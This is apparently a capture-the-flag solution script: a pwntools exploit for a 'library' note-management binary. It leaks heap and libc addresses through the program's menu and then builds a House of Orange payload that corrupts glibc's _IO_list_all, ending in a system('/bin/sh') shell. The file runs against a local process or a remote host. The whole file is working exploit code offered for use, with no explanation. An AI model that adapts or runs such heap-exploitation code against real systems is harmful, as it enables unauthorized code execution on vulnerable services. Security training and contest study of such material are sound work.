from pwn import *
context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

def login(p, idx):
	p.recvuntil('id:')
	p.sendline(str(idx))

def logout(p):
	p.recvuntil('4. exit')
	p.sendline('4')

def add(p, title, sections):
	p.recvuntil('4. exit')
	p.sendline('1')
	p.recvuntil('title:')
	p.send(title)
	p.recvuntil('sections')
	p.sendline(str(len(sections)))
	for i,j,k in sections:
		p.recvuntil('name')
		p.send(i)
		p.recvuntil('length:')
		p.sendline(str(j))
		p.recvuntil('content:')
		p.send(k)

def delete(p, title):
	p.recvuntil('4. exit')
	p.sendline('3')
	p.recvuntil('title:')
	p.send(title)

def read(p, name):
	p.recvuntil('4. exit')
	p.sendline('3')
	p.recvuntil('library?')
	p.send(name)

def HouseOfOrange(head_addr, system_addr, io_list_all_addr):
    exp = '/bin/sh'.ljust(8, '\x00') + p64(0x61) + p64(0) + p64(io_list_all_addr - 0x10)
    exp += p64(0) + p64(1) + p64(0) * 9 + p64(system_addr) + p64(0) * 4
    exp += p64(head_addr + 18 * 8) + p64(2) + p64(3) + p64(0) + p64(0xffffffffffffffff) + p64(0) * 2 + p64(head_addr + 12 * 8)
    return exp

def GameStart(ip, port, debug):
	if debug == 1:
		p = process('./library', env = {'LD_PRELOAD' : './libc.so.6'})
	else:
		p = remote(ip, port)
	login(p, 0)
	add(p, 'a\x00', [('2333', 0x30, 'a')])
	add(p, 'b\x00', [])
	add(p, 'c\x00', [])
	add(p, 'd\x00', [])
	delete(p, 'a\n')
	delete(p, 'd\n')
	add(p, 'd\n', [('xnuca', 0x30, 'a'.ljust(0x18, 'a'))])
	logout(p)
	login(p, 1)
	read(p, 'd\n')
	p.recvuntil('a' * 0x18)
	heap_addr = u64(p.recvuntil('xnuca')[ : -5].ljust(8, '\x00'))
	log.info('heap addr is ' + hex(heap_addr))
	p.recvuntil('note?')
	p.sendline('N')

	logout(p)
	login(p, 0)
	add(p, 'a\x00', [])
	add(p, 'b\x00', [])
	add(p, 'c\x00', [])
	delete(p, 'd\x00')
	delete(p, 'a\x00')
	delete(p, 'b\x00')
	add(p, 'd\x00', [('hhhhh', 0x500, 'a'.ljust(0x18, 'a')), ('xnuca', 0x30, 'a'.ljust(0x8, 'a'))])
	logout(p)
	login(p, 1)
	read(p, 'd\n')
	p.recvuntil('a' * 0x8)
	libc_addr = u64(p.recvuntil('xnuca')[ : -5].ljust(8, '\x00')) - 0x3c4ba8
	log.info('libc addr is ' + hex(libc_addr))
	p.recvuntil('note?')
	p.sendline('N')
	logout(p)
	login(p, 0)
	add(p, 'a\x00', [])
	add(p, 'b\x00', [])
	add(p, 'c\x00', [])
	add(p, 'd\x00', [])
	add(p, 'e\x00', [])
	add(p, 'f\x00', [])
	add(p, 'g\x00', [])
	add(p, 'h\x00', [])

	delete(p, 'e\x00')
	delete(p, 'd\x00')
	delete(p, 'c\x00')
	delete(p, 'g\x00')
	# gdb.attach(p, 'c')
	add(p, '2\x00', [('hhhhh', 0x500, HouseOfOrange(heap_addr + 0xbd0, libc_addr + 0x45390, libc_addr + 0x3c5520)), ('xnuca', 0x18, 'a'.ljust(0x10, '\x00') + p64(0) + p64(0x21) + p64(0) + p64(heap_addr + 0xbd0))])#, ('hhhhh', 0x500, 'swing')])
	# p.recvuntil('4. exit')
	# p.sendline('1')
	p.recvuntil('4. exit')
	p.sendline('1')
	p.recvuntil('title:')
	p.send('2')
	p.recvuntil('sections')
	p.sendline(str(1))

	p.interactive()

if __name__ == '__main__':
	GameStart('', 2333, 1)